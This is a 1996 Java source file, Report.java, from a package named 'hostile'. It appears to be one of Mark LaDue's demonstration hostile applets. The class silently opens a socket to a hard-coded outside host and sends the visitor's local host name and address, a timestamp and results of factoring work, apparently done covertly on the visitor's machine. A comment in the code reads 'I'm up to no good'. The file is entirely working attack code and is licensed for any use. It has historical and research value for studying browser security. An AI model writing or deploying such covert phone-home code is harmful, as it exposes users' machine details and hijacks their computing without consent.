package hostile;

/*  Report.java by Mark D. LaDue */

/*  March 2, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This class allows the applet to communicate with its home. */

import java.applet.Applet;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.util.Date;

public class Report {

    public String home = new String("www.math.gatech.edu");
    public int port = 9000;
    public String localhome = null;
    public boolean debug = false;
    public InetAddress localHome = null;
    public String localAddress = null;
    public Date rightNow;

//  Construct the class
    Report(String home, int port) {
        this.home = home;
        this.port = port;
    }

    public void communicate(String teststr, String factorstr) {
        Socket socker = null;
        OutputStream outerStream = null;
        byte by[] = new byte[4096];
        int numberbytes;
        InetAddress inneraddress = null;
        String response = null;
        StringBuffer responsebuf = new StringBuffer();
//      System.out.println("I'm up to no good");
        try {
            socker = new Socket(home, port);
            outerStream = socker.getOutputStream();
        }
        catch (IOException ioe) {
            if (debug)
                System.out.println("I can't open a socket to " + home);
        }
        try {
            if (debug)
                System.out.println("Sending factoring information to" + home);
            inneraddress = socker.getInetAddress();
            try {
                localHome = inneraddress.getLocalHost();
                localAddress = localHome.toString();
            }
            catch (UnknownHostException u) {
                System.out.println("I can't get the remote host's name");
            }
            rightNow = new Date();
            String time = rightNow.toString();
            responsebuf.append(localAddress + "\t" + time + "\t" +
                               teststr + "\t" + factorstr + "\n");
            response = responsebuf.toString();
            numberbytes = response.length();
            response.getBytes(0, numberbytes, by, 0);
            outerStream.write(by, 0, numberbytes);
        }
        catch (IOException ioe) {
            if (debug)
                System.out.println("I can't talk to " + home);
        }
    }
}
 
